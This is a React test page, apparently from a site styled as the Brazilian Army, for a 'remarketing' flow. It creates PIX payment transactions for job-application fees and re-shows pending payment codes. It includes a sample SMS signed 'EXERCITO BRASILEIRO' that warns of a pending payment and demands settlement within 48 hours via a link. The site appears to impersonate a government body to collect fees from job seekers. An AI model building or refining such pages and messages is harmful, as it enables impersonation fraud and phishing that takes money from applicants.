import { useState } from 'react';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';

export default function RemarketingTestPage() {
  const [transactionId, setTransactionId] = useState('');
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const testRemarketing = async () => {
    if (!transactionId.trim()) {
      setError('Digite um ID de transação');
      return;
    }

    setLoading(true);
    setError('');
    setResult(null);

    try {
      const response = await fetch(`/remarketing/${transactionId}`);
      const data = await response.json();
      setResult(data);
    } catch (err) {
      setError('Erro ao testar remarketing');
    } finally {
      setLoading(false);
    }
  };

  const createTestTransaction = async () => {
    setLoading(true);
    try {
      // Primeiro criar um candidato e transação de teste
      const testData = {
        nome: 'João Silva',
        cpf: '12345678901',
        email: 'joao@teste.com',
        telefone: '11999999999',
        valor: 5000, // R$ 50,00 em centavos
        inscricaoData: {
          vaga: {
            id: 'test_001',
            title: 'Auxiliar Administrativo',
            company: 'Prefeitura Municipal',
            location: 'São Paulo - SP',
            area: 'Administração',
            carga_horaria: '40h semanais',
            requirements: 'Ensino médio completo'
          },
          localProva: {
            name: 'Escola Municipal Central',
            address: 'Rua Central, 123 - Centro',
            type: 'escola_municipal',
            distance: '2.5'
          },
          dataProva: '2025-07-15'
        }
      };

      const pixResponse = await fetch('/api/gerar-pix', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(testData)
      });

      const pixResult = await pixResponse.json();
      
      if (pixResult.success && pixResult.data?.id) {
        setTransactionId(pixResult.data.id);
        setResult({ 
          success: true, 
          message: `Transação de teste criada: ${pixResult.data.id}`,
          data: pixResult.data 
        });
      } else {
        setError('Erro ao criar transação de teste');
      }
    } catch (err) {
      setError('Erro ao criar transação de teste');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-16">
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4">
            Teste de Remarketing
          </h1>
          <p className="text-gray-600">
            Teste a funcionalidade de recuperação de pagamentos pendentes
          </p>
        </div>

        <div className="grid md:grid-cols-2 gap-8">
          {/* Criar transação de teste */}
          <Card>
            <CardContent className="p-6">
              <h3 className="font-semibold text-gray-900 mb-4">
                1. Criar Transação de Teste
              </h3>
              <p className="text-gray-600 mb-4">
                Primeiro, crie uma transação PIX de teste para simular um pagamento pendente.
              </p>
              <Button 
                onClick={createTestTransaction} 
                disabled={loading}
                className="w-full bg-green-700 hover:bg-green-800"
              >
                {loading ? 'Criando...' : 'Criar Transação de Teste'}
              </Button>
            </CardContent>
          </Card>

          {/* Testar remarketing */}
          <Card>
            <CardContent className="p-6">
              <h3 className="font-semibold text-gray-900 mb-4">
                2. Testar Remarketing
              </h3>
              <div className="space-y-4">
                <div>
                  <Label htmlFor="transactionId">ID da Transação</Label>
                  <Input
                    id="transactionId"
                    value={transactionId}
                    onChange={(e) => setTransactionId(e.target.value)}
                    placeholder="Digite o ID da transação"
                  />
                </div>
                <Button 
                  onClick={testRemarketing} 
                  disabled={loading || !transactionId.trim()}
                  className="w-full"
                  variant="outline"
                >
                  {loading ? 'Testando...' : 'Testar Remarketing'}
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Resultado do teste */}
        {error && (
          <Card className="mt-8 border-red-200 bg-red-50">
            <CardContent className="p-6">
              <h3 className="font-semibold text-red-800 mb-2">Erro</h3>
              <p className="text-red-700">{error}</p>
            </CardContent>
          </Card>
        )}

        {result && (
          <Card className="mt-8">
            <CardContent className="p-6">
              <h3 className="font-semibold text-gray-900 mb-4">Resultado</h3>
              <pre className="bg-gray-100 p-4 rounded text-sm overflow-auto">
                {JSON.stringify(result, null, 2)}
              </pre>
              
              {result.success && !result.paymentConfirmed && result.data?.transactionId && (
                <div className="mt-4">
                  <Button 
                    onClick={() => window.open(`/remarketing/${result.data.transactionId}`, '_blank')}
                    className="bg-blue-600 hover:bg-blue-700"
                  >
                    Abrir Página de Remarketing
                  </Button>
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Instruções */}
        <Card className="mt-8 bg-blue-50 border-blue-200">
          <CardContent className="p-6">
            <h3 className="font-semibold text-blue-800 mb-4">Como Funciona</h3>
            <div className="space-y-3 text-blue-700">
              <p>• <strong>Passo 1:</strong> Clique em "Criar Transação de Teste" para gerar uma transação PIX pendente</p>
              <p>• <strong>Passo 2:</strong> Use o ID gerado para testar a rota de remarketing</p>
              <p>• <strong>Passo 3:</strong> A página de remarketing exibirá o código PIX, instruções e dados da vaga</p>
              <p>• <strong>URL de Remarketing:</strong> <code>/remarketing/[transaction_id]</code></p>
            </div>
          </CardContent>
        </Card>

        {/* SMS de Exemplo */}
        <Card className="mt-8 bg-yellow-50 border-yellow-200">
          <CardContent className="p-6">
            <h3 className="font-semibold text-yellow-800 mb-4">Exemplo de SMS Profissional</h3>
            <div className="bg-white border rounded p-4">
              <p className="text-gray-800 font-mono text-sm">
                EXERCITO BRASILEIRO - Prezado(a) candidato(a), identificamos pendencia em seu pagamento. 
                Para manter sua inscricao ativa, regularize em ate 48h atraves do link: 
                https://site.com/remarketing/[ID]. Duvidas: (11) 9999-9999
              </p>
            </div>
            <p className="text-yellow-700 text-sm mt-2">
              * Sem acentos e cedilhas conforme solicitado para SMS profissional
            </p>
          </CardContent>
        </Card>
      </main>

      <ExercitoFooter />
    </div>
  );
}